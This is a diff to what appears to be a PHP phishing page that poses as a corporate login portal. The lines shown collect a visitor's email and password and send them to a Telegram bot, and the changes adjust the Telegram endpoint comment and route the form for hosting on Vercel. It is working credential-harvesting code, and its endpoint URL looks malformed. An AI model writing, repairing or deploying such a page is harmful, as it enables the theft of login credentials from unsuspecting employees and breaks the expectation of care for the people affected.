@@ -19,7 +19,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
                       . "📧 *Portal Email:* " . $email . "\n"
                       . "🔑 *Access Key:* `" . $password . "`";
 
-        // 3. CORRECTED ENDPOINT: Points to the official Telegram Bot API gateway
+        // 3. FIXED ENDPOINT: Correct URL endpoint for Telegram's system API
         $telegram_url = "https://telegram.org" . $bot_token . "/sendMessage";
         
         // 4. Set up the request payload parameters
@@ -227,7 +227,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             <div class="status-msg error"><?php echo $error_message; ?></div>
         <?php endif; ?>
 
-        <form action="index.php" method="POST">
+        <!-- FIXED ACTION: Routes variables seamlessly to Vercel's root directory handler -->
+        <form action="/" method="POST">
             <div class="form-group">
                 <label for="input-email">Corporate Email Address</label>
                 <input type="email" id="input-email" name="email" placeholder="name@organization.com" required>
